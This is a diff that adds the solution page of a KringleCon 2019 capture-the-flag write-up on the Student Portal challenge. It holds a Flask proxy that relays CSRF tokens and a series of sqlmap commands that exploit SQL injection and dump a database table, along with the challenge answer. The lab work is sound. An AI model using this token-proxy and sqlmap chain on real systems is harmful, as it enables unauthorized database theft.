@@ -5,14 +5,14 @@
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         
-        
+        <meta name="author" content="Thomas Bouve">
         
         <link rel="shortcut icon" href="../../img/favicon.ico">
         <title>Retrieve the Scraps of Paper from Server - KringleCon 2019 Write-Up</title>
         <link href="../../css/bootstrap-custom.min.css" rel="stylesheet">
         <link href="../../css/font-awesome.min.css" rel="stylesheet">
         <link href="../../css/base.css" rel="stylesheet">
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/gruvbox-light.min.css">
         <link href="../../css/extra.css" rel="stylesheet">
         <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
         <!--[if lt IE 9]>
@@ -23,7 +23,10 @@
         <script src="../../js/jquery-1.10.2.min.js" defer></script>
         <script src="../../js/bootstrap-3.0.3.min.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/pythons.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/css.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/powershell.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script>
         <script>hljs.initHighlightingOnLoad();</script> 
     </head>
 
@@ -64,15 +67,15 @@
 </li>
                                     
 <li >
-    <a href="../c3/">Windows Log Analysis - Evaluate Attack Outcome</a>
+    <a href="../c3/">Evaluate Attack Outcome</a>
 </li>
                                     
 <li >
-    <a href="../c4/">Windows Log Analysis - Determine Attacker Technique</a>
+    <a href="../c4/">Determine Attacker Technique</a>
 </li>
                                     
 <li >
-    <a href="../c5/">Network Log Analysis - Determine Compromised System</a>
+    <a href="../c5/">Determine Compromised System</a>
 </li>
                                     
 <li >
@@ -100,7 +103,7 @@
 </li>
                                     
 <li >
-    <a href="../c12/">Filter Out Poisoned Sources of Weather Data</a>
+    <a href="../c12/">Filter Out Poisoned Data Sources</a>
 </li>
                                 </ul>
                             </li>
@@ -117,7 +120,7 @@
 </li>
                                     
 <li >
-    <a href="../../hints/h5/">Sparkle Redberry - Xmas Cheer</a>
+    <a href="../../hints/h5/">Sparkle Redberry - Xmas Cheer Laser</a>
 </li>
                                     
 <li >
@@ -150,88 +153,27 @@
                                 </ul>
                             </li>
                             <li class="dropdown">
-                                <a href="#" class="dropdown-toggle" data-toggle="dropdown">Conversations <b class="caret"></b></a>
-                                <ul class="dropdown-menu">
-                                    
-<li >
-    <a href="../../conversations/alabaster-snowball/">Alabaster Snowball</a>
-</li>
-                                    
-<li >
-    <a href="../../conversations/bushy-evergreen/">Bushy Evergreen</a>
-</li>
-                                    
-<li >
-    <a href="../../conversations/holly-evergreen/">Holly Evergreen</a>
-</li>
-                                    
-<li >
-    <a href="../../conversations/kent-tinseltooth/">Kent Tinseltooth</a>
-</li>
-                                    
-<li >
-    <a href="../../conversations/krampus/">Krampus</a>
-</li>
-                                    
-<li >
-    <a href="../../conversations/minty-candycane/">Minty Candycane</a>
-</li>
-                                    
-<li >
-    <a href="../../conversations/pepper-minstix/">Pepper Minstix</a>
-</li>
-                                    
-<li >
-    <a href="../../conversations/professor-banas/">Professor Banas</a>
-</li>
-                                    
-<li >
-    <a href="../../conversations/santa/">Santa</a>
-</li>
-                                    
-<li >
-    <a href="../../conversations/shinny-upatree/">Shinny Upatree</a>
-</li>
-                                    
-<li >
-    <a href="../../conversations/sparkle-redberry/">Sparkle Redberry</a>
-</li>
-                                    
-<li >
-    <a href="../../conversations/sugarplum-mary/">SugarPlum Mary</a>
-</li>
-                                    
-<li >
-    <a href="../../conversations/tangle-coalbox/">Tangle Coalbox</a>
-</li>
-                                    
-<li >
-    <a href="../../conversations/tooth-fairy/">Tooth Fairy</a>
-</li>
-                                    
-<li >
-    <a href="../../conversations/turtle-doves/">Turtle Doves</a>
-</li>
-                                    
-<li >
-    <a href="../../conversations/wunorse-openslae/">Wunorse Openslae</a>
-</li>
-                                </ul>
-                            </li>
-                            <li class="dropdown">
                                 <a href="#" class="dropdown-toggle" data-toggle="dropdown">Scripts <b class="caret"></b></a>
                                 <ul class="dropdown-menu">
                                     
 <li >
-    <a href="../../scripts/frosty-keypad/">Frosty Keypad</a>
+    <a href="../../scripts/find_code.py/">find_code.py</a>
 </li>
                                     
 <li >
-    <a href="../../scripts/frido-sleigh-capteha/">Frido Sleigh CAPTEHA</a>
+    <a href="../../scripts/capteha_api.py/">capteha_api.py</a>
 </li>
                                     
 <li >
-    <a href="../../scripts/poisoned-source-filter/">Poisoned Source Filter</a>
+    <a href="../../scripts/token_proxy.py/">token_proxy.py</a>
+</li>
+                                    
+<li >
+    <a href="../../scripts/decrypt_pdf.py/">decrypt_pdf.py</a>
+</li>
+                                    
+<li >
+    <a href="../../scripts/match_user_agents.py/">match_user_agents.py</a>
 </li>
                                 </ul>
                             </li>
@@ -240,19 +182,15 @@
                                 <ul class="dropdown-menu">
                                     
 <li >
-    <a href="../../misc/progress_tokens/">Progress Tokens</a>
-</li>
-                                    
-<li >
     <a href="../../misc/interesting_ui/">Interesting UI Elements</a>
 </li>
                                     
 <li >
-    <a href="../../misc/user_accounts/">User Accounts</a>
+    <a href="../../misc/progress_tokens/">Progress Tokens</a>
 </li>
                                     
 <li >
-    <a href="../../misc/badge_hints/">Badge Hints</a>
+    <a href="../../misc/user_accounts/">User Accounts</a>
 </li>
                                 </ul>
                             </li>
@@ -282,15 +220,122 @@
         <div class="container">
                 <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
     <ul class="nav bs-sidenav">
+        <li class="main active"><a href="#retrieve-the-scraps-of-paper-from-server">Retrieve the Scraps of Paper from Server</a></li>
+            <li><a href="#request">Request</a></li>
+            <li><a href="#resources">Resources</a></li>
+            <li><a href="#solution">Solution</a></li>
+            <li><a href="#answer">Answer</a></li>
+            <li><a href="#hint">Hint</a></li>
     </ul>
 </div></div>
                 <div class="col-md-9" role="main">
 
-</div>
+<h1 id="retrieve-the-scraps-of-paper-from-server">Retrieve the Scraps of Paper from Server<a class="headerlink" href="#retrieve-the-scraps-of-paper-from-server" title="Permanent link">#</a></h1>
+<p><strong>Hint</strong>: <a href="../../hints/h9/">Pepper Minstix - Graylog</a></p>
+<h2 id="request">Request<a class="headerlink" href="#request" title="Permanent link">#</a></h2>
+<blockquote>
+<p>Gain access to the data on the <a href="https://studentportal.elfu.org/">Student Portal</a> server and retrieve the paper scraps hosted there.<br />
+What is the name of Santa's cutting-edge sleigh guidance system?<br />
+For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix.  </p>
+<p>Krampus:<br />
+Unfortunately, I managed to lock out my account on the server.<br />
+Hey! You’ve got some great skills. Would you please hack into my system and retrieve the scans?<br />
+I give you permission to hack into it, solving Objective 9 in your badge.<br />
+And, as long as you're traveling around, be sure to solve any other challenges you happen across.</p>
+</blockquote>
+<h2 id="resources">Resources<a class="headerlink" href="#resources" title="Permanent link">#</a></h2>
+<ul>
+<li><a href="https://studentportal.elfu.org/">Student Portal</a></li>
+<li><a href="https://www.owasp.org/index.php/SQL_injection">OWASP SQL Injection</a></li>
+<li><a href="https://pen-testing.sans.org/blog/2017/10/13/sqlmap-tamper-scripts-for-the-win">SQLMAP Tamper Scripts for The Win</a></li>
+</ul>
+<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">#</a></h2>
+<p>Pepper hints at using blind SQLi to retrieve the scraps from the server but whipping out <a href="http://sqlmap.org">sqlmap</a> won't do us much good at this point. Both the <code>apply.php</code> and <code>check.php</code> pages contain a set of custom JavaScript functions that first retrieve a token value from <code>validator.php</code>. This value is then added to the form data and submitted to the server as a way to prevent <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">Cross-site request forgery</a> (CSRF). For each request the server will first check the token and only accept the request if the token is valid.</p>
+<p><img alt="JavaScript" src="../../img/challenges/c9/c9_1.png" /></p>
+<p>In other words, unless we tell sqlmap to submit a valid token with each of its requests, chances are the SQLi attempts won't even hit the backend database. Fortunately for us sqlmap has a <code>--csrf-url</code> option which allows you to specify a URL from where to retrieve tokens. Unfortunately for us, sqlmap also requires specifying the token field name via the <code>--csrf-token</code> option and <code>validator.php</code> doesn't set any token field names. It just returns the token value as-is.</p>
+<pre><code class="shell">sqlmap -u &quot;https://studentportal.elfu.org/application-check.php?elfmail=McElfin%40example.com&amp;token=y&quot; \
+--csrf-url https://studentportal.elfu.org/validator.php --csrf-token=
+</code></pre>
+
+<p><img alt="Token Response" src="../../img/challenges/c9/c9_2.png" />
+<img alt="Sqlmap Fail" src="../../img/challenges/c9/c9_3.png" /></p>
+<p>The problem can be solved by translating the <code>validator.php</code> response data to a format that sqlmap accepts (i.e. contains a token field name in the header or response body). When the below <a href="../../scripts/token_proxy.py/">Flask proxy script</a> script receives a GET request it grabs a token value from <code>validator.php</code> and adds it as the value to a <code>token</code> field in both the header and body of its own HTTP response. </p>
+<pre><code class="python">#!/usr/bin/env python3
+# token_proxy.py
+import requests
+from flask import Flask, Response
+app = Flask(__name__)
+
+
+@app.route(&quot;/&quot;)
+def token():
+    &quot;&quot;&quot;Return a token.&quot;&quot;&quot;
+    url = 'https://studentportal.elfu.org/validator.php'
+    token = requests.Session().get(url).text
+    # Put the token in the body, input tag, and header.
+    resp = Response(
+        f'Token:{token}\n'
+        '&lt;form&gt;\n'
+        f'  &lt;input type=&quot;hidden&quot; id=&quot;token&quot; name=&quot;token&quot; value=&quot;{token}&quot;/&gt;\n'
+        '&lt;/form&gt;\n'
+    )
+    resp.headers['token'] = token
+    return resp
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0')
+</code></pre>
+
+<p>Start the Flask proxy app so it's ready to respond to incoming token requests.</p>
+<pre><code class="shell">python3 token_proxy.py
+</code></pre>
+
+<p><img alt="Flask Proxy" src="../../img/challenges/c9/c9_5.png" />
+<img alt="Proxy Token Response" src="../../img/challenges/c9/c9_4_both.png" /></p>
+<p>Now run the earlier sqlmap command again but with the <code>--csrf-url</code> parameter set to our proxy listening on 127.0.0.1:5000 and <code>--csrf-token</code> set to 'token'. This will allow sqlmap to send valid HTTP requests to the server and execute its SQLi attacks.</p>
+<pre><code class="shell">sqlmap -u &quot;https://studentportal.elfu.org/application-check.php?elfmail=McElfin%40example.com&amp;token=y&quot; \
+--csrf-url http://127.0.0.1:5000/ --csrf-token=token
+</code></pre>
+
+<p><img alt="Sqlmap Success 1" src="../../img/challenges/c9/c9_6.png" />
+<img alt="Sqlmap Success 2" src="../../img/challenges/c9/c9_7.png" /></p>
+<p>We now know the database type (i.e. MySQL) and that the setup is vulnerable to at least three types of SQL Injection attacks via the <code>elfmail</code> GET parameter: boolean-based blind, error-based, and time-based blind. Grab an overview of the available databases.</p>
+<pre><code class="shell">sqlmap -u &quot;https://studentportal.elfu.org/application-check.php?elfmail=McElfin%40example.com&amp;token=y&quot; \
+--csrf-url http://127.0.0.1:5000/ --csrf-token=token --dbms=mysql --dbs
+</code></pre>
+
+<p><img alt="Sqlmap DBs" src="../../img/challenges/c9/c9_8.png" /></p>
+<p><code>information_schema</code> is a default MySQL database so request the tables for <code>elfu</code>.</p>
+<pre><code class="shell">sqlmap -u &quot;https://studentportal.elfu.org/application-check.php?elfmail=McElfin%40example.com&amp;token=y&quot; \
+--csrf-url http://127.0.0.1:5000/ --csrf-token=token --dbms=mysql --tables -D elfu
+</code></pre>
+
+<p><img alt="Sqlmap Tables" src="../../img/challenges/c9/c9_9.png" /></p>
+<p>Out of the three tables in the <code>elfu</code> database <code>krampus</code> looks like a good candidate so let's dump that.</p>
+<pre><code class="shell">sqlmap -u &quot;https://studentportal.elfu.org/application-check.php?elfmail=McElfin%40example.com&amp;token=y&quot; \
+--csrf-url http://127.0.0.1:5000/ --csrf-token=token --dbms=mysql -D elfu -T krampus --dump
+</code></pre>
+
+<p><img alt="Sqlmap Dump" src="../../img/challenges/c9/c9_10.png" /></p>
+<p>Well that looks pretty promising. Download the PNG files from the Student Portal and reassemble them using an image editor.</p>
+<p><img alt="Letter" src="../../img/challenges/c9/letter.png" /></p>
+<h2 id="answer">Answer<a class="headerlink" href="#answer" title="Permanent link">#</a></h2>
+<p>Sleigh guidance system name: <code>Super Sled-o-matic</code></p>
+<h2 id="hint">Hint<a class="headerlink" href="#hint" title="Permanent link">#</a></h2>
+<blockquote>
+<p>Wow! We’ve uncovered quite a nasty plot to destroy the holiday season.<br />
+We’ve gotta stop whomever is behind it!<br />
+I managed to find this protected document on one of the compromised machines in our environment.<br />
+I think our attacker was in the process of exfiltrating it.<br />
+I’m convinced that it is somehow associated with the plan to destroy the holidays. Can you decrypt it?<br />
+There are some smart people in the NetWars challenge room who may be able to help us.</p>
+</blockquote></div>
         </div>
 
         <footer class="col-md-12">
             <hr>
+                <p>Thomas Bouve - <a href="https://twitter.com/crahan">@CraHan</a></p>
             <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
         </footer>
         <script>
